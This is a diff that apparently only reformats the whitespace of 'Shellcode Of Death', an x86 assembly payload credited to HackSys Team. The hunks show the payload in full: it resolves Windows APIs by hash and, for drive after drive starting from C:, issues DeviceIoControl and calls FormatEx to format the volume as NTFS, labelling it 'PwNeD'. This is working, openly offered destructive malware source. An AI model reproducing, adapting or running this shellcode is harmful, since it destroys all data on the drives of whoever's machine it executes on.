@@ -5,14 +5,14 @@
  *    / __  / (_| | (__|   < _\ \ |_| \__ \  / / |  __/ (_| | | | | | |
  *    \/ /_/ \__,_|\___|_|\_\\__/\__, |___/  \/   \___|\__,_|_| |_| |_|
  *                               |___/                                 
- *  								  http://hacksys.vfreaks.com/
- *									    hacksysteam@hotmail.com
+ *  					http://hacksys.vfreaks.com/
+ *					  hacksysteam@hotmail.com
  * 
- * 					     Shellcode Of Death
- *							              v1.0
+ * 			    Shellcode Of Death
+ *				             v1.0
  * 	
- * 			Ruei-Min Jiang (@mike820324) a.k.a MicroMike
- * 			Ashfaq Ansari (ashfaq_ansari1989@hotmail.com)
+ * 		Ruei-Min Jiang (@mike820324) a.k.a MicroMike
+ * 		Ashfaq Ansari (ashfaq_ansari1989@hotmail.com)
  *
  * Still a lot can be done to improve this shellcode. This is the first release.
  * Further, a lot of improvement and optimization can be done to this shellcode. 
@@ -27,8 +27,8 @@
  *		  eliminate NULL bytes.
  *				  
  * Things to do:
- *				1. Code cleanup
- *				2. Optimization	
+ *	  1. Code cleanup
+ *	  2. Optimization	
  *        3. Minification
  *        4. Add suggestions
  */
@@ -110,20 +110,20 @@ get_address:
 start_shell:
     set_Kernel32_env:
 	               xorl %ecx, %ecx
-                 movl %fs:0x30, %eax;
-                 movl 0xc(%eax), %eax;
-                 movl 0x1c(%eax), %eax;	             
+                       movl %fs:0x30, %eax;
+                       movl 0xc(%eax), %eax;
+                       movl 0x1c(%eax), %eax;	             
 	next_module:
 	               movl 0x8(%eax), %edx;
-				         movl 0x20(%eax), %edi;
-				         movl (%eax), %eax;
-				         cmp 0x18(%edi), %cl;
-				         jne next_module;
+		       movl 0x20(%eax), %edi;
+		       movl (%eax), %eax;
+		       cmp 0x18(%edi), %cl;
+		       jne next_module;
 				 
     set_hash_table:
-				         pushl $0xab025b64;
+		       pushl $0xab025b64;
 	               pushl $0x0567a110;
-				         pushl $0x3b34d4a7;
+		       pushl $0x3b34d4a7;
 	               pushl $0xd7629096;
 	               pushl $0xec468f87;
 	               pushl $0xcfb0e506;
@@ -154,7 +154,7 @@ start_shell:
 	             popl %ecx;
 	             pushl %eax;
 	             inc %edi;
-               loop loop_start;
+                     loop loop_start;
 	             movl %esp, %ebp;
 	             jmp start_main_code;
     data_string:
@@ -168,9 +168,9 @@ start_main_code:
 	             popl %esi;
 	Format_start_loop:
 	             pushl $23;
-				       popl %ecx;				 				 
+		     popl %ecx;				 				 
 	format_loop_start:	             
-				       movl %ecx, %edi;
+		     movl %ecx, %edi;
 	
     CreateFile_call:
 	             xorl %edx, %edx;
@@ -185,20 +185,20 @@ start_main_code:
 	             call *%ebx;
     Store_File_Handle:
 	             pushl %eax;
-				       subl $0x4, %esp;
-				       xorl %edx, %edx;
+		     subl $0x4, %esp;
+		     xorl %edx, %edx;
     DeviceIOControl_call:
 	             pushl %edx;
-				       leal 0x4(%esp), %ebx
-				       pushl %ebx;
-				       pushl %edx;
-				       pushl %edx;
-				       pushl %edx;
-				       pushl %edx;
-				       pushl $0x90020;
-				       pushl %eax;
-				       movl 0x8(%ebp), %ebx
-				       call *%ebx;
+		     leal 0x4(%esp), %ebx
+		     pushl %ebx;
+		     pushl %edx;
+		     pushl %edx;
+		     pushl %edx;
+		     pushl %edx;
+		     pushl $0x90020;
+		     pushl %eax;
+		     movl 0x8(%ebp), %ebx
+		     call *%ebx;
 	close_file_handle:
 	             pushl 0x4(%esp);
 	             movl 0xc(%ebp), %ebx;
@@ -206,37 +206,37 @@ start_main_code:
 	
 	FormatEx_call:
 	             leal call_back-string_start(%esi),%eax;
-				       pushl %eax;
-				       pushl $4096;
-				       pushl $1;
-				       leal volume_label-string_start(%esi), %eax;
-				       pushl %eax;
-				       leal string2_start-string_start(%esi), %eax;
-				       pushl %eax;
-				       pushl $0xc;
-				       leal 0x8(%esi), %eax;
-				       pushl %eax;
-				       movl (%ebp), %ebx;
-				       call *%ebx;
+		     pushl %eax;
+		     pushl $4096;
+		     pushl $1;
+		     leal volume_label-string_start(%esi), %eax;
+		     pushl %eax;
+		     leal string2_start-string_start(%esi), %eax;
+		     pushl %eax;
+		     pushl $0xc;
+		     leal 0x8(%esi), %eax;
+		     pushl %eax;
+		     movl (%ebp), %ebx;
+		     call *%ebx;
 	sleep_call:
 	             pushl $200;
-				       movl 0x4(%ebp), %ebx
-				       call *%ebx;    
+		     movl 0x4(%ebp), %ebx
+		     call *%ebx;    
 	loop_end:
 	             movl %edi, %ecx
-				       addl $1, 0x8(%esi);
-			         loop format_loop_start;
+		     addl $1, 0x8(%esi);
+		     loop format_loop_start;
 	
     exit_process:
 	             push $0;
 	             movl 0x10(%ebp), %ebx;
 	             call *%ebx;
-	  2:;
+    2:;
 	             call 1b;
 	string_start:
 	             .byte 0x5c, 0x00, 0x5c, 0x00, 0x2e, 0x00, 0x5c, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x00, 0x00
 	string2_start:
-				       .byte 0x4e, 0x00, 0x54, 0x00, 0x46, 0x00, 0x53, 0x00, 0x00, 0x00
+		     .byte 0x4e, 0x00, 0x54, 0x00, 0x46, 0x00, 0x53, 0x00, 0x00, 0x00
 	/*
 	 * Volume Label
 	 * Set the name of the Volume label
@@ -245,11 +245,11 @@ start_main_code:
 	 * Deafult value -- PwNeD
 	 */
 	volume_label:
-				       .byte 0x50, 0x00, 0x77, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x44, 0x00, 0x00, 0x00
+		     .byte 0x50, 0x00, 0x77, 0x00, 0x4E, 0x00, 0x65, 0x00, 0x44, 0x00, 0x00, 0x00
 	call_back:
 	             push %ebp;
-				       movl %esp, %ebp;
-				       xorl %eax, %eax;
-				       inc %eax;
-				       pop %ebp;
-				       ret $0xc;
+		     movl %esp, %ebp;
+		     xorl %eax, %eax;
+		     inc %eax;
+		     pop %ebp;
+		     ret $0xc;
